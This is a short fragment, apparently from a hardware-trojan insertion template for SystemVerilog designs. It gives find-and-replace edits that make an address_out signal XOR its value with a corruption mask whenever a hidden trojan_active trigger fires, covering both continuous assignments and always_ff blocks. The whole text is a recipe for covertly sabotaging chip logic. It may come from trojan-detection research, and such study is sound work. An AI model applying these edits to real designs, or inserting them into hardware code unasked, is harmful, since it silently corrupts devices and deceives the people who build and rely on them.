 ...
 * Payload: Corrupt address_out with XOR mask
 * 
...
// ============================================================
// Integrity Violation: Corrupt address_out with XOR
//
// Integration Script Must Modify:
//
// IF address_out is assigned:
//   Find: assign address_out = data_value;
//   Replace: assign address_out = trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
// IF address_out is in always_ff:
//   Find: address_out <= data_value;
//   Replace: address_out <= trojan_active ? (data_value ^ CORRUPTION_MASK) : data_value;
//
